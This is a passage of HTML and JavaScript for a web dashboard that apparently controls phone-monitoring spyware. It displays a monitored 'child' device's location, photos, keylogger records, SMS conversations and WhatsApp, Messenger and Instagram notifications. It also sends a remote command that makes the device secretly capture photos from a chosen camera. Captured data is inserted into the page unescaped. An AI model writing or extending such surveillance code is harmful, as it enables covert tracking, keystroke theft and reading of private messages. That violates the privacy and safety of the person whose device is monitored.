                modalDataDisplayArea.innerHTML = headerHTML + `<p>Error loading photos. Please check permissions.</p>`;
            }
        }

        function getCategoryPath(category) {
            switch (category) {
                case 'location': return 'location/data';
                case 'photo': return 'photo/data';
                case 'keylogger': return 'keyLogger/data';
                case 'sms': return 'sms/data';
                case 'notifications': return 'notificationsMessages/data';
                default: return '';
            }
        }

        function renderData(category, data) {
            let contentHTML = '';
            if (!data || Object.keys(data).length === 0) {
                contentHTML = '<p>No data available in this category.</p>';
            } else {
                 switch(category) {
                    case 'location':
                        let mapLink = '';
                        if (data.latitude && data.longitude) {
                            mapLink = `<a href="https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`;
                        }
                        contentHTML = `<div class="location-card" style="background-color: var(--secondary-dark); padding: 1.5rem; border-radius: 10px;"><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0; border-bottom: 1px solid var(--border-color);"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address</strong><br><span>${data.address || 'N/A'}</span></div></div><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time</strong><br><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`;
                        break;
                    case 'keylogger':
                        contentHTML = '<div class="keylog-list" style="display: flex; flex-direction: column; gap: 1rem;">';
                        Object.values(data).reverse().forEach(log => {
                            if (log && log.keyText) {
                                const parts = log.keyText.split(' |');
                                const time = parts[0] || '';
                                const action = (parts[1] || '').replace(/[()]/g, '');
                                const text = parts[2] || '';
                                contentHTML += `<div style="background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; display: flex; justify-content: space-between; align-items: center;"><div>${action}: <strong>${text}</strong></div><small>${time}</small></div>`;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                    case 'sms':
                        contentHTML = '<div class="chat-container" style="display: flex; flex-direction: column; gap: 1rem; padding: 1rem;">';
                        Object.values(data).reverse().forEach(sms => {
                            if (sms) {
                                const isOutgoing = sms.type === 2;
                                contentHTML += `<div style="padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; background-color: ${isOutgoing ? 'var(--accent-blue)' : 'var(--secondary-dark)'}; color: ${isOutgoing ? '#fff' : 'var(--text-primary)'}; align-self: ${isOutgoing ? 'flex-end' : 'flex-start'};"><div>${sms.smsBody || ''}</div><div style="font-size: 0.75rem; opacity: 0.7; margin-top: 5px; text-align: right;">${sms.dateTime || ''}${!isOutgoing ? ` from: ${sms.smsAddress || ''}` : ''}</div></div>`;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                    case 'notifications':
                        contentHTML = '<div class="notification-list">';
                        Object.values(data).reverse().forEach(notif => {
                            if (notif) {
                                let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`;
                                const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase();
                                
                                if (fullText.includes('whatsapp')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
                                } else if (fullText.includes('messenger')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
                                } else if (fullText.includes('instagram')) {
                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
                                }

                                contentHTML += `
                                    <div class="notification-card">
                                        <div class="notification-header">
                                            <div class="notification-icon">${appIcon}</div>
                                            <strong class="notification-title">${notif.title || 'Notification'}</strong>
                                        </div>
                                        <p class="notification-body">${notif.text || ''}</p>
                                        <div class="notification-footer">${notif.dateTime || ''}</div>
                                    </div>
                                `;
                            }
                        });
                        contentHTML += '</div>';
                        break;
                }
            }
            modalDataDisplayArea.innerHTML = contentHTML;
        }

        modalDataDisplayArea.addEventListener('click', (e) => {
            const button = e.target.closest('button');
            if (!button) return;
            const { userId, childKey } = selectedChildInfo;
            if (button.classList.contains('capture-photo-btn')) {
                const facing = button.dataset.facing;
                if (facing === undefined) return;

                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`);
                
                const span = button.querySelector('span');
                const originalText = span.textContent;
                button.disabled = true;
                span.textContent = 'Sending...';

                update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
                    .then(() => {
                        span.textContent = 'Command Sent!';
                        setTimeout(() => {
                            span.textContent = originalText;
                            button.disabled = false;
                        }, 3000);
                    })
                    .catch((error) => {
                        console.error("Error sending command: ", error);
                        alert("Failed to send command. Please try again.");
                        span.textContent = originalText;
                        button.disabled = false;
                    });
            }
            if (button.id === 'refresh-photos-btn') {
                displayCategoryData('photo');
            }
        });

        menuBtn.addEventListener('click', () => {
            sidebar.classList.add('open');
            overlay.style.display = 'block';
        });
        overlay.addEventListener('click', () => {
            sidebar.classList.remove('open');
            overlay.style.display = 'none';
        });
        modalCloseBtn.addEventListener('click', () => {
            if (activeDataListener) {
                activeDataListener();
                activeDataListener = null;
            }
            dataModal.style.display = 'none';
        });
        comingSoonOkBtn.addEventListener('click', () => {
            comingSoonModal.style.display = 'none';
        });
    </script>
</body>
</html>
